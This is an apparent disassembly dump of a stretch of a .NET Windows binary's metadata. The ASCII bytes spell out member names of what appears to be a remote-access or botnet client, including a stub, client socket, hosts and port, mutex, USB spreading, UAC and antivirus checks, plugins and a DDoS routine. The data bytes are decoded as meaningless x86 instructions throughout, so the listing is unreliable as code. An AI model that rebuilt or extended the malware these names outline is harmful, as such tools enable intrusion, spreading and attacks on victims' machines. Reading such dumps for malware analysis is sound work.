  40656f:	00 07                	add    %al,(%edi)
  406571:	00 09                	add    %cl,(%ecx)
  406573:	00 02                	add    %al,(%edx)
  406575:	00 0f                	add    %cl,(%edi)
  406577:	00 0b                	add    %cl,(%ebx)
  406579:	00 ee                	add    %ch,%dh
  40657b:	15 2d 19 38 19       	adc    $0x1938192d,%eax
  406580:	43                   	inc    %ebx
  406581:	19 75 00             	sbb    %esi,0x0(%ebp)
  406584:	75 00                	jne    0x406586
  406586:	88 00                	mov    %al,(%eax)
  406588:	f5                   	cmc
  406589:	01 fc                	add    %edi,%esp
  40658b:	01 03                	add    %eax,(%ebx)
  40658d:	02 0a                	add    (%edx),%cl
  40658f:	02 07                	add    (%edi),%al
  406591:	03 6c 05 d1          	add    -0x2f(%ebp,%eax,1),%ebp
  406595:	06                   	push   %es
  406596:	e5 06                	in     $0x6,%eax
  406598:	00 01                	add    %al,(%ecx)
  40659a:	69 00 89 04 01 00    	imul   $0x10489,(%eax),%eax
  4065a0:	43                   	inc    %ebx
  4065a1:	01 6b 00             	add    %ebp,0x0(%ebx)
  4065a4:	e1 04                	loope  0x4065aa
  4065a6:	01 00                	add    %eax,(%eax)
  4065a8:	40                   	inc    %eax
  4065a9:	01 81 00 6e 05 02    	add    %eax,0x2056e00(%ecx)
  4065af:	00 00                	add    %al,(%eax)
  4065b1:	01 87 00 d8 05 03    	add    %eax,0x305d800(%edi)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	01 8d 00 55 06 03    	add    %ecx,0x3065500(%ebp)
  4065bf:	00 00                	add    %al,(%eax)
  4065c1:	01 8f 00 83 06 03    	add    %ecx,0x3068300(%edi)
  4065c7:	00 40 01             	add    %al,0x1(%eax)
  4065ca:	91                   	xchg   %eax,%ecx
  4065cb:	00 a1 06 04 00 04    	add    %ah,0x4000406(%ecx)
  4065d1:	80 00 00             	addb   $0x0,(%eax)
  4065d4:	01 00                	add    %eax,(%eax)
	...
  4065e2:	76 1a                	jbe    0x4065fe
  4065e4:	00 00                	add    %al,(%eax)
  4065e6:	04 00                	add    $0x0,%al
	...
  4065f0:	00 00                	add    %al,(%eax)
  4065f2:	01 00                	add    %eax,(%eax)
  4065f4:	0a 00                	or     (%eax),%al
  4065f6:	00 00                	add    %al,(%eax)
  4065f8:	00 00                	add    %al,(%eax)
  4065fa:	0a 00                	or     (%eax),%al
	...
  406604:	00 00                	add    %al,(%eax)
  406606:	0a 00                	or     (%eax),%al
  406608:	13 00                	adc    (%eax),%eax
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	04 00                	add    $0x0,%al
	...
  406618:	00 00                	add    %al,(%eax)
  40661a:	01 00                	add    %eax,(%eax)
  40661c:	46                   	inc    %esi
  40661d:	01 00                	add    %eax,(%eax)
  40661f:	00 00                	add    %al,(%eax)
  406621:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40662c:	00 00                	add    %al,(%eax)
  40662e:	0a 00                	or     (%eax),%al
  406630:	a2 0d 00 00 00       	mov    %al,0xd
  406635:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406640:	00 00                	add    %al,(%eax)
  406642:	0a 00                	or     (%eax),%al
  406644:	3e 10 00             	adc    %al,%ds:(%eax)
  406647:	00 00                	add    %al,(%eax)
  406649:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406654:	00 00                	add    %al,(%eax)
  406656:	01 00                	add    %eax,(%eax)
  406658:	82 10 00             	adcb   $0x0,(%eax)
  40665b:	00 00                	add    %al,(%eax)
  40665d:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406668:	00 00                	add    %al,(%eax)
  40666a:	01 00                	add    %eax,(%eax)
  40666c:	72 14                	jb     0x406682
  40666e:	00 00                	add    %al,(%eax)
  406670:	00 00                	add    %al,(%eax)
  406672:	05 00 04 00 06       	add    $0x6000400,%eax
  406677:	00 04 00             	add    %al,(%eax,%eax,1)
  40667a:	0e                   	push   %cs
  40667b:	00 0d 00 0f 00 0d    	add    %cl,0xd000f00
  406681:	00 11                	add    %dl,(%ecx)
  406683:	00 0a                	add    %cl,(%edx)
  406685:	00 00                	add    %al,(%eax)
  406687:	00 10                	add    %dl,(%eax)
  406689:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40668c:	4c                   	dec    %esp
  40668d:	02 00                	add    (%eax),%al
  40668f:	00 10                	add    %dl,(%eax)
  406691:	00 19                	add    %bl,(%ecx)
  406693:	00 4c 02 00          	add    %cl,0x0(%edx,%eax,1)
  406697:	00 00                	add    %al,(%eax)
  406699:	00 1b                	add    %bl,(%ebx)
  40669b:	00 4c 02 2d          	add    %cl,0x2d(%edx,%eax,1)
  40669f:	00 93 02 2d 00 0e    	add    %dl,0xe002d02(%ebx)
  4066a5:	03 81 01 01 07 e3    	add    -0x1cf8feff(%ecx),%eax
  4066ab:	01 37                	add    %esi,(%edi)
  4066ad:	08 00                	or     %al,(%eax)
  4066af:	00 00                	add    %al,(%eax)
  4066b1:	3c 4d                	cmp    $0x4d,%al
  4066b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4066b4:	64 75 6c             	fs jne 0x406723
  4066b7:	65 3e 00 6d 73       	gs add %ch,%ds:0x73(%ebp)
  4066bc:	63 6f 72             	arpl   %ebp,0x72(%edi)
  4066bf:	6c                   	insb   (%dx),%es:(%edi)
  4066c0:	69 62 00 4d 69 63 72 	imul   $0x7263694d,0x0(%edx),%esp
  4066c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4066c8:	73 6f                	jae    0x406739
  4066ca:	66 74 2e             	data16 je 0x4066fb
  4066cd:	56                   	push   %esi
  4066ce:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4066d5:	73 69                	jae    0x406740
  4066d7:	63 00                	arpl   %eax,(%eax)
  4066d9:	4d                   	dec    %ebp
  4066da:	79 41                	jns    0x40671d
  4066dc:	70 70                	jo     0x40674e
  4066de:	6c                   	insb   (%dx),%es:(%edi)
  4066df:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4066e6:	00 4d 79             	add    %cl,0x79(%ebp)
  4066e9:	00 4d 79             	add    %cl,0x79(%ebp)
  4066ec:	43                   	inc    %ebx
  4066ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4066ee:	6d                   	insl   (%dx),%es:(%edi)
  4066ef:	70 75                	jo     0x406766
  4066f1:	74 65                	je     0x406758
  4066f3:	72 00                	jb     0x4066f5
  4066f5:	4d                   	dec    %ebp
  4066f6:	79 50                	jns    0x406748
  4066f8:	72 6f                	jb     0x406769
  4066fa:	6a 65                	push   $0x65
  4066fc:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  406700:	79 57                	jns    0x406759
  406702:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  406706:	72 76                	jb     0x40677e
  406708:	69 63 65 73 00 54 68 	imul   $0x68540073,0x65(%ebx),%esp
  40670f:	72 65                	jb     0x406776
  406711:	61                   	popa
  406712:	64 53                	fs push %ebx
  406714:	61                   	popa
  406715:	66 65 4f             	gs dec %di
  406718:	62 6a 65             	bound  %ebp,0x65(%edx)
  40671b:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  40671f:	6f                   	outsl  %ds:(%esi),(%dx)
  406720:	76 69                	jbe    0x40678b
  406722:	64 65 72 60          	fs gs jb 0x406786
  406726:	31 00                	xor    %eax,(%eax)
  406728:	53                   	push   %ebx
  406729:	65 74 74             	gs je  0x4067a0
  40672c:	69 6e 67 73 00 4d 61 	imul   $0x614d0073,0x67(%esi),%ebp
  406733:	69 6e 00 53 74 75 62 	imul   $0x62757453,0x0(%esi),%ebp
  40673a:	00 43 6c             	add    %al,0x6c(%ebx)
  40673d:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  406744:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  406748:	4d                   	dec    %ebp
  406749:	65 73 73             	gs jae 0x4067bf
  40674c:	61                   	popa
  40674d:	67 65 73 00          	addr16 gs jae 0x406751
  406751:	55                   	push   %ebp
  406752:	6e                   	outsb  %ds:(%esi),(%dx)
  406753:	69 6e 73 74 61 6c 6c 	imul   $0x6c6c6174,0x73(%esi),%ebp
  40675a:	65 72 00             	gs jb  0x40675d
  40675d:	41                   	inc    %ecx
  40675e:	6c                   	insb   (%dx),%es:(%edi)
  40675f:	67 6f                	outsl  %ds:(%si),(%dx)
  406761:	72 69                	jb     0x4067cc
  406763:	74 68                	je     0x4067cd
  406765:	6d                   	insl   (%dx),%es:(%edi)
  406766:	41                   	inc    %ecx
  406767:	45                   	inc    %ebp
  406768:	53                   	push   %ebx
  406769:	00 48 65             	add    %cl,0x65(%eax)
  40676c:	6c                   	insb   (%dx),%es:(%edi)
  40676d:	70 65                	jo     0x4067d4
  40676f:	72 00                	jb     0x406771
  406771:	4c                   	dec    %esp
  406772:	41                   	inc    %ecx
  406773:	53                   	push   %ebx
  406774:	54                   	push   %esp
  406775:	49                   	dec    %ecx
  406776:	4e                   	dec    %esi
  406777:	50                   	push   %eax
  406778:	55                   	push   %ebp
  406779:	54                   	push   %esp
  40677a:	49                   	dec    %ecx
  40677b:	4e                   	dec    %esi
  40677c:	46                   	inc    %esi
  40677d:	4f                   	dec    %edi
  40677e:	00 45 58             	add    %al,0x58(%ebp)
  406781:	45                   	inc    %ebp
  406782:	43                   	inc    %ebx
  406783:	55                   	push   %ebp
  406784:	54                   	push   %esp
  406785:	49                   	dec    %ecx
  406786:	4f                   	dec    %edi
  406787:	4e                   	dec    %esi
  406788:	5f                   	pop    %edi
  406789:	53                   	push   %ebx
  40678a:	54                   	push   %esp
  40678b:	41                   	inc    %ecx
  40678c:	54                   	push   %esp
  40678d:	45                   	inc    %ebp
  40678e:	00 4d 69             	add    %cl,0x69(%ebp)
  406791:	63 72 6f             	arpl   %esi,0x6f(%edx)
  406794:	73 6f                	jae    0x406805
  406796:	66 74 2e             	data16 je 0x4067c7
  406799:	56                   	push   %esi
  40679a:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4067a1:	73 69                	jae    0x40680c
  4067a3:	63 2e                	arpl   %ebp,(%esi)
  4067a5:	41                   	inc    %ecx
  4067a6:	70 70                	jo     0x406818
  4067a8:	6c                   	insb   (%dx),%es:(%edi)
  4067a9:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4067b0:	53                   	push   %ebx
  4067b1:	65 72 76             	gs jb  0x40682a
  4067b4:	69 63 65 73 00 41 70 	imul   $0x70410073,0x65(%ebx),%esp
  4067bb:	70 6c                	jo     0x406829
  4067bd:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4067c4:	42                   	inc    %edx
  4067c5:	61                   	popa
  4067c6:	73 65                	jae    0x40682d
  4067c8:	00 2e                	add    %ch,(%esi)
  4067ca:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  4067ce:	00 4d 69             	add    %cl,0x69(%ebp)
  4067d1:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4067d4:	73 6f                	jae    0x406845
  4067d6:	66 74 2e             	data16 je 0x406807
  4067d9:	56                   	push   %esi
  4067da:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4067e1:	73 69                	jae    0x40684c
  4067e3:	63 2e                	arpl   %ebp,(%esi)
  4067e5:	44                   	inc    %esp
  4067e6:	65 76 69             	gs jbe 0x406852
  4067e9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4067ec:	00 43 6f             	add    %al,0x6f(%ebx)
  4067ef:	6d                   	insl   (%dx),%es:(%edi)
  4067f0:	70 75                	jo     0x406867
  4067f2:	74 65                	je     0x406859
  4067f4:	72 00                	jb     0x4067f6
  4067f6:	53                   	push   %ebx
  4067f7:	79 73                	jns    0x40686c
  4067f9:	74 65                	je     0x406860
  4067fb:	6d                   	insl   (%dx),%es:(%edi)
  4067fc:	00 4f 62             	add    %cl,0x62(%edi)
  4067ff:	6a 65                	push   $0x65
  406801:	63 74 00 2e          	arpl   %esi,0x2e(%eax,%eax,1)
  406805:	63 63 74             	arpl   %esp,0x74(%ebx)
  406808:	6f                   	outsl  %ds:(%esi),(%dx)
  406809:	72 00                	jb     0x40680b
  40680b:	67 65 74 5f          	addr16 gs je 0x40686e
  40680f:	43                   	inc    %ebx
  406810:	6f                   	outsl  %ds:(%esi),(%dx)
  406811:	6d                   	insl   (%dx),%es:(%edi)
  406812:	70 75                	jo     0x406889
  406814:	74 65                	je     0x40687b
  406816:	72 00                	jb     0x406818
  406818:	6d                   	insl   (%dx),%es:(%edi)
  406819:	5f                   	pop    %edi
  40681a:	43                   	inc    %ebx
  40681b:	6f                   	outsl  %ds:(%esi),(%dx)
  40681c:	6d                   	insl   (%dx),%es:(%edi)
  40681d:	70 75                	jo     0x406894
  40681f:	74 65                	je     0x406886
  406821:	72 4f                	jb     0x406872
  406823:	62 6a 65             	bound  %ebp,0x65(%edx)
  406826:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  40682a:	6f                   	outsl  %ds:(%esi),(%dx)
  40682b:	76 69                	jbe    0x406896
  40682d:	64 65 72 00          	fs gs jb 0x406831
  406831:	67 65 74 5f          	addr16 gs je 0x406894
  406835:	41                   	inc    %ecx
  406836:	70 70                	jo     0x4068a8
  406838:	6c                   	insb   (%dx),%es:(%edi)
  406839:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  406840:	00 6d 5f             	add    %ch,0x5f(%ebp)
  406843:	41                   	inc    %ecx
  406844:	70 70                	jo     0x4068b6
  406846:	4f                   	dec    %edi
  406847:	62 6a 65             	bound  %ebp,0x65(%edx)
  40684a:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  40684e:	6f                   	outsl  %ds:(%esi),(%dx)
  40684f:	76 69                	jbe    0x4068ba
  406851:	64 65 72 00          	fs gs jb 0x406855
  406855:	55                   	push   %ebp
  406856:	73 65                	jae    0x4068bd
  406858:	72 00                	jb     0x40685a
  40685a:	67 65 74 5f          	addr16 gs je 0x4068bd
  40685e:	55                   	push   %ebp
  40685f:	73 65                	jae    0x4068c6
  406861:	72 00                	jb     0x406863
  406863:	6d                   	insl   (%dx),%es:(%edi)
  406864:	5f                   	pop    %edi
  406865:	55                   	push   %ebp
  406866:	73 65                	jae    0x4068cd
  406868:	72 4f                	jb     0x4068b9
  40686a:	62 6a 65             	bound  %ebp,0x65(%edx)
  40686d:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  406871:	6f                   	outsl  %ds:(%esi),(%dx)
  406872:	76 69                	jbe    0x4068dd
  406874:	64 65 72 00          	fs gs jb 0x406878
  406878:	67 65 74 5f          	addr16 gs je 0x4068db
  40687c:	57                   	push   %edi
  40687d:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  406881:	72 76                	jb     0x4068f9
  406883:	69 63 65 73 00 6d 5f 	imul   $0x5f6d0073,0x65(%ebx),%esp
  40688a:	4d                   	dec    %ebp
  40688b:	79 57                	jns    0x4068e4
  40688d:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  406891:	72 76                	jb     0x406909
  406893:	69 63 65 73 4f 62 6a 	imul   $0x6a624f73,0x65(%ebx),%esp
  40689a:	65 63 74 50 72       	arpl   %esi,%gs:0x72(%eax,%edx,2)
  40689f:	6f                   	outsl  %ds:(%esi),(%dx)
  4068a0:	76 69                	jbe    0x40690b
  4068a2:	64 65 72 00          	fs gs jb 0x4068a6
  4068a6:	41                   	inc    %ecx
  4068a7:	70 70                	jo     0x406919
  4068a9:	6c                   	insb   (%dx),%es:(%edi)
  4068aa:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4068b1:	00 57 65             	add    %dl,0x65(%edi)
  4068b4:	62 53 65             	bound  %edx,0x65(%ebx)
  4068b7:	72 76                	jb     0x40692f
  4068b9:	69 63 65 73 00 45 71 	imul   $0x71450073,0x65(%ebx),%esp
  4068c0:	75 61                	jne    0x406923
  4068c2:	6c                   	insb   (%dx),%es:(%edi)
  4068c3:	73 00                	jae    0x4068c5
  4068c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4068c6:	00 47 65             	add    %al,0x65(%edi)
  4068c9:	74 48                	je     0x406913
  4068cb:	61                   	popa
  4068cc:	73 68                	jae    0x406936
  4068ce:	43                   	inc    %ebx
  4068cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4068d0:	64 65 00 54 79 70    	fs add %dl,%gs:0x70(%ecx,%edi,2)
  4068d6:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4068da:	74 54                	je     0x406930
  4068dc:	79 70                	jns    0x40694e
  4068de:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  4068e3:	74 72                	je     0x406957
  4068e5:	69 6e 67 00 43 72 65 	imul   $0x65724300,0x67(%esi),%ebp
  4068ec:	61                   	popa
  4068ed:	74 65                	je     0x406954
  4068ef:	5f                   	pop    %edi
  4068f0:	5f                   	pop    %edi
  4068f1:	49                   	dec    %ecx
  4068f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4068f3:	73 74                	jae    0x406969
  4068f5:	61                   	popa
  4068f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4068f7:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  4068fa:	5f                   	pop    %edi
  4068fb:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  4068ff:	6e                   	outsb  %ds:(%esi),(%dx)
  406900:	73 74                	jae    0x406976
  406902:	61                   	popa
  406903:	6e                   	outsb  %ds:(%esi),(%dx)
  406904:	63 65 00             	arpl   %esp,0x0(%ebp)
  406907:	44                   	inc    %esp
  406908:	69 73 70 6f 73 65 5f 	imul   $0x5f65736f,0x70(%ebx),%esi
  40690f:	5f                   	pop    %edi
  406910:	49                   	dec    %ecx
  406911:	6e                   	outsb  %ds:(%esi),(%dx)
  406912:	73 74                	jae    0x406988
  406914:	61                   	popa
  406915:	6e                   	outsb  %ds:(%esi),(%dx)
  406916:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  406919:	5f                   	pop    %edi
  40691a:	00 67 65             	add    %ah,0x65(%edi)
  40691d:	74 5f                	je     0x40697e
  40691f:	47                   	inc    %edi
  406920:	65 74 49             	gs je  0x40696c
  406923:	6e                   	outsb  %ds:(%esi),(%dx)
  406924:	73 74                	jae    0x40699a
  406926:	61                   	popa
  406927:	6e                   	outsb  %ds:(%esi),(%dx)
  406928:	63 65 00             	arpl   %esp,0x0(%ebp)
  40692b:	6d                   	insl   (%dx),%es:(%edi)
  40692c:	5f                   	pop    %edi
  40692d:	54                   	push   %esp
  40692e:	68 72 65 61 64       	push   $0x64616572
  406933:	53                   	push   %ebx
  406934:	74 61                	je     0x406997
  406936:	74 69                	je     0x4069a1
  406938:	63 56 61             	arpl   %edx,0x61(%esi)
  40693b:	6c                   	insb   (%dx),%es:(%edi)
  40693c:	75 65                	jne    0x4069a3
  40693e:	00 47 65             	add    %al,0x65(%edi)
  406941:	74 49                	je     0x40698c
  406943:	6e                   	outsb  %ds:(%esi),(%dx)
  406944:	73 74                	jae    0x4069ba
  406946:	61                   	popa
  406947:	6e                   	outsb  %ds:(%esi),(%dx)
  406948:	63 65 00             	arpl   %esp,0x0(%ebp)
  40694b:	48                   	dec    %eax
  40694c:	6f                   	outsl  %ds:(%esi),(%dx)
  40694d:	73 74                	jae    0x4069c3
  40694f:	73 00                	jae    0x406951
  406951:	48                   	dec    %eax
  406952:	6f                   	outsl  %ds:(%esi),(%dx)
  406953:	73 74                	jae    0x4069c9
  406955:	00 50 6f             	add    %dl,0x6f(%eax)
  406958:	72 74                	jb     0x4069ce
  40695a:	00 4b 45             	add    %cl,0x45(%ebx)
  40695d:	59                   	pop    %ecx
  40695e:	00 53 50             	add    %dl,0x50(%ebx)
  406961:	4c                   	dec    %esp
  406962:	00 53 6c             	add    %dl,0x6c(%ebx)
  406965:	65 65 70 00          	gs gs jo 0x406969
  406969:	47                   	inc    %edi
  40696a:	72 6f                	jb     0x4069db
  40696c:	75 70                	jne    0x4069de
  40696e:	00 55 53             	add    %dl,0x53(%ebp)
  406971:	42                   	inc    %edx
  406972:	4e                   	dec    %esi
  406973:	4d                   	dec    %ebp
  406974:	00 4d 75             	add    %cl,0x75(%ebp)
  406977:	74 65                	je     0x4069de
  406979:	78 00                	js     0x40697b
  40697b:	69 73 43 6f 6e 6e 65 	imul   $0x656e6e6f,0x43(%ebx),%esi
  406982:	63 74 65 64          	arpl   %esi,0x64(%ebp,%eiz,2)
  406986:	00 53 79             	add    %dl,0x79(%ebx)
  406989:	73 74                	jae    0x4069ff
  40698b:	65 6d                	gs insl (%dx),%es:(%edi)
  40698d:	2e 4e                	cs dec %esi
  40698f:	65 74 2e             	gs je  0x4069c0
  406992:	53                   	push   %ebx
  406993:	6f                   	outsl  %ds:(%esi),(%dx)
  406994:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  406997:	74 73                	je     0x406a0c
  406999:	00 53 6f             	add    %dl,0x6f(%ebx)
  40699c:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40699f:	74 00                	je     0x4069a1
  4069a1:	53                   	push   %ebx
  4069a2:	00 42 75             	add    %al,0x75(%edx)
  4069a5:	66 66 65 72 4c       	data16 data16 gs jb 0x4069f6
  4069aa:	65 6e                	outsb  %gs:(%esi),(%dx)
  4069ac:	67 74 68             	addr16 je 0x406a17
  4069af:	00 42 75             	add    %al,0x75(%edx)
  4069b2:	66 66 65 72 00       	data16 data16 gs jb 0x4069b7
  4069b7:	53                   	push   %ebx
  4069b8:	79 73                	jns    0x406a2d
  4069ba:	74 65                	je     0x406a21
  4069bc:	6d                   	insl   (%dx),%es:(%edi)
  4069bd:	2e 49                	cs dec %ecx
  4069bf:	4f                   	dec    %edi
  4069c0:	00 4d 65             	add    %cl,0x65(%ebp)
  4069c3:	6d                   	insl   (%dx),%es:(%edi)
  4069c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4069c5:	72 79                	jb     0x406a40
  4069c7:	53                   	push   %ebx
  4069c8:	74 72                	je     0x406a3c
  4069ca:	65 61                	gs popa
  4069cc:	6d                   	insl   (%dx),%es:(%edi)
  4069cd:	00 4d 53             	add    %cl,0x53(%ebp)
  4069d0:	00 53 79             	add    %dl,0x79(%ebx)
  4069d3:	73 74                	jae    0x406a49
  4069d5:	65 6d                	gs insl (%dx),%es:(%edi)
  4069d7:	2e 54                	cs push %esp
  4069d9:	68 72 65 61 64       	push   $0x64616572
  4069de:	69 6e 67 00 54 69 6d 	imul   $0x6d695400,0x67(%esi),%ebp
  4069e5:	65 72 00             	gs jb  0x4069e8
  4069e8:	54                   	push   %esp
  4069e9:	69 63 6b 00 4d 61 6e 	imul   $0x6e614d00,0x6b(%ebx),%esp
  4069f0:	75 61                	jne    0x406a53
  4069f2:	6c                   	insb   (%dx),%es:(%edi)
  4069f3:	52                   	push   %edx
  4069f4:	65 73 65             	gs jae 0x406a5c
  4069f7:	74 45                	je     0x406a3e
  4069f9:	76 65                	jbe    0x406a60
  4069fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4069fc:	74 00                	je     0x4069fe
  4069fe:	61                   	popa
  4069ff:	6c                   	insb   (%dx),%es:(%edi)
  406a00:	6c                   	insb   (%dx),%es:(%edi)
  406a01:	44                   	inc    %esp
  406a02:	6f                   	outsl  %ds:(%esi),(%dx)
  406a03:	6e                   	outsb  %ds:(%esi),(%dx)
  406a04:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  406a08:	6e                   	outsb  %ds:(%esi),(%dx)
  406a09:	64 53                	fs push %ebx
  406a0b:	79 6e                	jns    0x406a7b
  406a0d:	63 00                	arpl   %eax,(%eax)
  406a0f:	53                   	push   %ebx
  406a10:	70 65                	jo     0x406a77
  406a12:	65 64 00 49 6e       	gs add %cl,%fs:0x6e(%ecx)
  406a17:	74 65                	je     0x406a7e
  406a19:	72 76                	jb     0x406a91
  406a1b:	61                   	popa
  406a1c:	6c                   	insb   (%dx),%es:(%edi)
  406a1d:	00 41 63             	add    %al,0x63(%ecx)
  406a20:	74 69                	je     0x406a8b
  406a22:	76 61                	jbe    0x406a85
  406a24:	74 65                	je     0x406a8b
  406a26:	50                   	push   %eax
  406a27:	6f                   	outsl  %ds:(%esi),(%dx)
  406a28:	6e                   	outsb  %ds:(%esi),(%dx)
  406a29:	67 00 42 65          	add    %al,0x65(%bp,%si)
  406a2d:	67 69 6e 43 6f 6e 6e 	imul   $0x656e6e6f,0x43(%bp),%ebp
  406a34:	65 
  406a35:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  406a39:	6f                   	outsl  %ds:(%esi),(%dx)
  406a3a:	6e                   	outsb  %ds:(%esi),(%dx)
  406a3b:	6e                   	outsb  %ds:(%esi),(%dx)
  406a3c:	65 63 74 53 65       	arpl   %esi,%gs:0x65(%ebx,%edx,2)
  406a41:	72 76                	jb     0x406ab9
  406a43:	65 72 00             	gs jb  0x406a46
  406a46:	48                   	dec    %eax
  406a47:	00 49 6e             	add    %cl,0x6e(%ecx)
  406a4a:	66 6f                	outsw  %ds:(%esi),(%dx)
  406a4c:	00 49 4e             	add    %cl,0x4e(%ecx)
  406a4f:	44                   	inc    %esp
  406a50:	41                   	inc    %ecx
  406a51:	54                   	push   %esp
  406a52:	45                   	inc    %ebp
  406a53:	00 53 70             	add    %dl,0x70(%ebx)
  406a56:	72 65                	jb     0x406abd
  406a58:	61                   	popa
  406a59:	64 00 55 41          	add    %dl,%fs:0x41(%ebp)
  406a5d:	43                   	inc    %ebx
  406a5e:	00 41 6e             	add    %al,0x6e(%ecx)
  406a61:	74 69                	je     0x406acc
  406a63:	76 69                	jbe    0x406ace
  406a65:	72 75                	jb     0x406adc
  406a67:	73 00                	jae    0x406a69
  406a69:	47                   	inc    %edi
  406a6a:	50                   	push   %eax
  406a6b:	55                   	push   %ebp
  406a6c:	00 43 50             	add    %al,0x50(%ebx)
  406a6f:	55                   	push   %ebp
  406a70:	00 52 41             	add    %dl,0x41(%edx)
  406a73:	4d                   	dec    %ebp
  406a74:	00 49 41             	add    %cl,0x41(%ecx)
  406a77:	73 79                	jae    0x406af2
  406a79:	6e                   	outsb  %ds:(%esi),(%dx)
  406a7a:	63 52 65             	arpl   %edx,0x65(%edx)
  406a7d:	73 75                	jae    0x406af4
  406a7f:	6c                   	insb   (%dx),%es:(%edi)
  406a80:	74 00                	je     0x406a82
  406a82:	42                   	inc    %edx
  406a83:	65 67 69 6e 52 65 63 	imul   $0x69656365,%gs:0x52(%bp),%ebp
  406a8a:	65 69 
  406a8c:	76 65                	jbe    0x406af3
  406a8e:	00 61 72             	add    %ah,0x72(%ecx)
  406a91:	00 42 65             	add    %al,0x65(%edx)
  406a94:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  406a9b:	00 
  406a9c:	62 00                	bound  %eax,(%eax)
  406a9e:	53                   	push   %ebx
  406a9f:	65 6e                	outsb  %gs:(%esi),(%dx)
  406aa1:	64 00 6d 73          	add    %ch,%fs:0x73(%ebp)
  406aa5:	67 00 45 6e          	add    %al,0x6e(%di)
  406aa9:	64 53                	fs push %ebx
  406aab:	65 6e                	outsb  %gs:(%esi),(%dx)
  406aad:	64 00 69 73          	add    %ch,%fs:0x73(%ecx)
  406ab1:	44                   	inc    %esp
  406ab2:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
  406ab9:	63 74 65 64          	arpl   %esi,0x64(%ebp,%eiz,2)
  406abd:	00 50 6f             	add    %dl,0x6f(%eax)
  406ac0:	6e                   	outsb  %ds:(%esi),(%dx)
  406ac1:	67 00 6f 62          	add    %ch,0x62(%bx)
  406ac5:	6a 00                	push   $0x0
  406ac7:	50                   	push   %eax
  406ac8:	69 6e 67 00 50 61 63 	imul   $0x63615000,0x67(%esi),%ebp
  406acf:	6b 00 52             	imul   $0x52,(%eax),%eax
  406ad2:	65 61                	gs popa
  406ad4:	64 00 52 53          	add    %dl,%fs:0x53(%edx)
  406ad8:	00 50 6c             	add    %dl,0x6c(%eax)
  406adb:	75 67                	jne    0x406b44
  406add:	69 6e 00 42 00 53 65 	imul   $0x65530042,0x0(%esi),%ebp
  406ae4:	6e                   	outsb  %ds:(%esi),(%dx)
  406ae5:	64 4d                	fs dec %ebp
  406ae7:	53                   	push   %ebx
  406ae8:	47                   	inc    %edi
  406ae9:	00 53 65             	add    %dl,0x65(%ebx)
  406aec:	6e                   	outsb  %ds:(%esi),(%dx)
  406aed:	64 45                	fs inc %ebp
  406aef:	72 72                	jb     0x406b63
  406af1:	6f                   	outsl  %ds:(%esi),(%dx)
  406af2:	72 00                	jb     0x406af4
  406af4:	54                   	push   %esp
  406af5:	68 72 65 61 64       	push   $0x64616572
  406afa:	00 44 44 6f          	add    %al,0x6f(%esp,%eax,2)
  406afe:	73 00                	jae    0x406b00
  406b00:	52                   	push   %edx
  406b01:	65 70 6f             	gs jo  0x406b73
  406b04:	72 74                	jb     0x406b7a
  406b06:	57                   	push   %edi
  406b07:	69 6e 64 6f 77 00 54 	imul   $0x5400776f,0x64(%esi),%ebp
  406b0e:	44                   	inc    %esp
  406b0f:	00 49 6e             	add    %cl,0x6e(%ecx)
  406b12:	70 75                	jo     0x406b89
  406b14:	74 00                	je     0x406b16
  406b16:	4d                   	dec    %ebp
  406b17:	6f                   	outsl  %ds:(%esi),(%dx)
  406b18:	6e                   	outsb  %ds:(%esi),(%dx)
